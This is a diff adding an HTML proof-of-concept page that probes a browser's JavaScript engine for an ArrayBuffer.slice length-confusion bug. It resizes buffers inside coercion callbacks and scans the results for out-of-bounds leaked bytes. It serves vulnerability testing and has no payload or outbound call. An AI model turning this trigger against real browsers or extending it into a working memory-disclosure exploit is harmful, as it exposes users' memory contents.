@@ -1,0 +1,61 @@
+<!doctype html>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SLICE-PROBE</title>
+<body style="background:#000;color:#0f0;font:14px monospace;white-space:pre-wrap;margin:10px">
+<div id=o>[SLICE-PROBE] CVE-2026-113064 slice length confusion</div>
+<script>
+const o=document.getElementById('o');
+const log=m=>o.textContent+="\n"+m;
+window.addEventListener('error',e=>log("[ERROR] "+e.message));
+log("[*] start");
+
+(async()=>{
+// C1: shrink during 'end' coercion — if slice copies old length => OOB read/leak
+try{
+  const ab=new ArrayBuffer(0x1000,{maxByteLength:0x100000});
+  new Uint8Array(ab).fill(0x41);
+  const s=ab.slice(0,{valueOf(){ ab.resize(0x10); return 0x8000; }});
+  const u=new Uint8Array(s);
+  let leak=0; for(let i=0x100;i<s.byteLength;i++) if(u[i]!==0x41) leak++;
+  log("C1: slice="+s.byteLength+" (ab now "+ab.byteLength+") non-marker bytes="+leak+(leak>0?" *** LEAK ***":""));
+}catch(e){log("C1: "+e.name);}
+
+// C2: grow during coercion
+try{
+  const ab=new ArrayBuffer(0x1000,{maxByteLength:0x100000});
+  const s=ab.slice(0,{valueOf(){ ab.resize(0x8000); return 0x8000; }});
+  log("C2: slice="+s.byteLength);
+}catch(e){log("C2: "+e.name);}
+
+// C3: begin+end both re-entrant, shrink in between
+try{
+  const ab=new ArrayBuffer(0x100,{maxByteLength:0x10000});
+  new Uint8Array(ab).fill(0x41);
+  const s=ab.slice({valueOf(){ ab.resize(0x10000); return 0; }},{valueOf(){ ab.resize(0x20); return 0x10000; }});
+  const u=new Uint8Array(s);
+  let leak=0; for(let i=0x20;i<s.byteLength;i++) if(u[i]!==0x41&&u[i]!==0) leak++;
+  log("C3: slice="+s.byteLength+" (ab now "+ab.byteLength+") suspicious="+leak+(leak>0?" *** LEAK ***":""));
+}catch(e){log("C3: "+e.name);}
+
+// C4: TypedArray.set with resize side effect
+try{
+  const ab=new ArrayBuffer(0x100,{maxByteLength:0x10000});
+  const ta=new Uint8Array(ab);
+  ta.set({length:0x40,get 0(){ ab.resize(0x40); return 0x42; }});
+  log("C4: set ok, ab="+ab.byteLength);
+}catch(e){log("C4: "+e.name);}
+
+// C5: brute force configs, flag slice>current
+let bad=0;
+for(let i=0;i<200000;i++){
+  const sz=8+(i%4096);
+  const ab=new ArrayBuffer(sz,{maxByteLength:0x100000});
+  try{
+    const s=ab.slice(i%2?0:{valueOf(){ab.resize(sz>>2);return 0;}},sz*2);
+    if(s.byteLength>ab.byteLength){bad++;if(bad<6)log("C5: i="+i+" slice="+s.byteLength+" ab="+ab.byteLength);}
+  }catch(_){}
+  if((i&0x3FF)===0&&i>0){log("[*] C5 i="+i+" bad="+bad);await new Promise(r=>setTimeout(r,0));}
+}
+log("C5 done bad="+bad);
+})();
+</script>
